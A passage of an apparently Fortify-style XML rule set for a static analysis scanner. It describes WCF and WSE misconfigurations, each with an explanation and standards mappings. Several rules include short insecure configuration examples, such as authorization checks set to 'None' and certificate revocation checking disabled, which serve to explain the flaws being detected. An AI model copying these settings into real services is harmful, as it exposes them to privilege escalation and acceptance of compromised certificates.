																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[5] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 651</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wcf_misconfiguration_throttling_not_enabled</key>
    <internalKey>Environment/WCF Misconfiguration/Throttling Not Enabled</internalKey>
    <name>WCF Misconfiguration: Throttling Not Enabled</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Not placing a limit on the use of system resources could result in resource exhaustion and ultimately a denial of service.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Windows Communication Foundation (WCF) offers the ability to throttle service requests. Allowing too many client requests can flood a system and exhaust its resources. On the other hand, allowing only a small number of requests to a service can prevent legitimate users from using the service. Each service should be individually tuned to and configured to allow the appropriate amount of resources.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em><serviceThrottling></em> Microsoft<br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II, APP3760 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II, APP3760 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II, APP3760 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II, APP3760 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Brute Force, Insufficient Anti-automation </em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 400, CWE ID 770</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Risky Resource Management - CWE ID 770</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wcf_misconfiguration_transport_security_enabled</key>
    <internalKey>Environment/WCF Misconfiguration/Transport Security Enabled</internalKey>
    <name>WCF Misconfiguration: Transport Security Enabled</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The application uses a WCF endpoint that relies upon transport mode transfer security. Transport mode is the least secure option and should be avoided.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Transport security specifies that confidentiality, integrity, and authentication are provided by transport-layer mechanisms (such as HTTPS). When using a transport like HTTPS, this mode has the advantage of being efficient in its performance and well understood because of its prevalence on the Internet. The disadvantage is that this kind of security is applied separately on each hop in the communication path, making the communication susceptible to a "man in the middle" attack.<br><br>WCF offers two other transfer security modes, both of which are preferable: message and transport with message credential. Message security uses the WS-Security specification to ensure confidentiality, integrity and authentication at the message level. This provides end-to-end security and flexibility in transport methods. However, it reduces performance.<br><br>The final method, transport with message credential, is a hybrid of transport and method. Message security is used to authenticate the client and transport security is used to authenticate the server and provide confidentiality and integrity. It is nearly as efficient as pure transport security.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A2 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A7 Broken Authentication and Session Management</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 285</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] J.D. Meier, Carlos Farre, Jason Taylor, Prashant Bansode, Steve Gregersen, Madhu Sundararajan, Rob Boucher <em>Improving Patterns and Practices: Improving Web Services Security Guide</em> Microsoft<br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15]  <em>Microsoft Delivery Network (MSDN)</em> Microsoft<br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 285</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 285</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10, Requirement 7.2</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3, Requirement 7.2</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7, Requirement 7.2</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8, Requirement 7.2</em> <br></p>
																									   <p>[22] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wcf_misconfiguration_unauthorized_access</key>
    <internalKey>Environment/WCF Misconfiguration/Unauthorized Access</internalKey>
    <name>WCF Misconfiguration: Unauthorized Access</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This service does not use an authorization control.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  When a client calls a particular WCF service, WCF provides various authorization schemes that verify that the caller has permission to execute the service method on the server. If authorization controls are not enabled for WCF services, an authenticated user can achieve privilege escalation.<br><br><br><b>Example 1:</b> The following configuration instructs WCF to not check the authorization level of the client when executing the service:<br><br><pre><br>&lt;behaviors&gt;<br>  &lt;serviceBehaviors&gt;<br>    &lt;behavior&gt;<br>      ...<br>      &lt;serviceAuthorization principalPermissionMode="None" /&gt;<br>    &lt;/behavior&gt;<br>  &lt;/serviceBehaviors&gt;<br>&lt;/behaviors&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[11] Dominick Baier and Christian Weyer <em>Authorization in WCF-Based Services</em> Microsoft Developer Network (MSDN)<br></p>
																									   <p>[12] Microsoft <em>Authorizing Access to Operations</em> Microsoft Developer Network (MSDN)<br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[14] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 264</em> <br></p>
																									   <p>[15] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[16] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[18] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wcf_misconfiguration_unsafe_revocation_mode</key>
    <internalKey>Environment/WCF Misconfiguration/Unsafe Revocation Mode</internalKey>
    <name>WCF Misconfiguration: Unsafe Revocation Mode</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Because the program fails to enable certificate revocation checking, it will accept certificates that are either known or are suspected to be compromised.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The certificate revocation list (CRL) is an optional component of a public key infrastructure (PKI) deployment that is created and signed by a certification authority and contains a list of certificates that it has issued and later revoked. Certificates can be revoked by a certification authority administrator, for example, if an issued certificate is known or suspected to be compromised.<br><br><b>Example 1:</b> In the following example, a service behavior is configured to perform no revocation checking when authenticating a certificate.<br><br><pre><br>&lt;behavior name="DefaultBehavior" returnUnknownExceptionsAsFaults="false"&gt;<br>  &lt;serviceCredentials&gt;<br>    &lt;serviceCertificate<br>      x509FindType="FindBySubjectName"<br>      findValue="MyCertificate"<br>      storeLocation="LocalMachine"<br>      storeName="My"/&gt;<br>    &lt;clientCertificate&gt;<br>      &lt;authentication certificateValidationMode="ChainTrust" revocationMode="None"/&gt;<br>    &lt;/clientCertificate&gt;<br>  &lt;/serviceCredentials&gt;<br>  &lt;metadataPublishing enableGetWsdl="true" enableMetadataExchange="true" enableHelpPage="true"/&gt;<br>&lt;/behavior&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 254</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[14]  <em>Microsoft Developer Network (MSDN)</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wcf_misconfiguration_weak_token</key>
    <internalKey>Environment/WCF Misconfiguration/Weak Token</internalKey>
    <name>WCF Misconfiguration: Weak Token</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using a UsernameToken with a plain text password over an unencrypted channel exposes the password to attackers who can sniff the SOAP messages.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Service Providers that use the UsernameToken might accept passwords sent in clear text. Sending clear text passwords over an unencrypted channel can expose the credential to attackers who can sniff the SOAP message.<br><br>The following WCF service provider configuration uses the UsernameToken:<br><pre><br>     ...<br>     &lt;security mode=&quot;Message&quot;&gt;<br>	 &lt;message clientCredentialType=&quot;UserName&quot; /&gt;<br>     ...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 254</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4, Requirement 8.2.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wse_misconfiguration_insufficient_encryption</key>
    <internalKey>Environment/WSE Misconfiguration/Insufficient Encryption</internalKey>
    <name>WSE Misconfiguration: Insufficient Encryption</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Failing to encrypt a signature increases the chance of a successful brute-force attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The <code>MessageProtectionOrder</code> attribute allows you to specify the order in which signatures and encryption are applied (and whether or not the signatures should be encrypted). Setting the <code>MessageProtectionOrder</code> attribute to anything other than <code>SignBeforeEncryptAndEncryptSignature</code> constitutes a potential security problem.<br><br>Below is a list of possible alternative to <code>SignBeforeEncryptAndEncryptSignature</code> and associated problems.<br>SignBeforeEncrypt - The signature is applied to the unencrypted message, but the signature itself is not encrypted.<br>EncryptBeforeSign - Message contents are encrypted then signed.<br><br>Messages signed with a low entropy keys, such as passwords, are more vulnerable to brute force attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[14]  <em>MessageProtectionOrder Enumeration</em> Microsoft<br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.3, Requirement 6.5.8</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wse_misconfiguration_missing_authorization</key>
    <internalKey>Environment/WSE Misconfiguration/Missing Authorization</internalKey>
    <name>WSE Misconfiguration: Missing Authorization</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Not explicitly setting the <code>&lt;authorization&gt;</code> tag can result in privilege escalation or anonymous access.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The <code>&lt;authorization&gt;</code> element specifies a list of authorization rules. If an <code>&lt;authorization&gt;</code> element exists and no rules apply to a sender, access is denied [1].<br>In this case, no <code>&lt;authorization&gt;</code> tag exists in <Replace key="PrimaryLocation.file"/> and anonymous access might be possible.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em><authorization> Element</em> Microsoft<br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A10 Failure to Restrict URL Access</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[12] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[13] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 285</em> <br></p>
																									   <p>[14] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authorization</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 285</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 285</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10, Requirement 7.2</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.10, Requirement 7.2</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8, Requirement 7.2</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8, Requirement 7.2</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wse_misconfiguration_unsigned_fault_timestamp</key>
    <internalKey>Environment/WSE Misconfiguration/Unsigned Fault Timestamp</internalKey>
    <name>WSE Misconfiguration: Unsigned Fault Timestamp</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
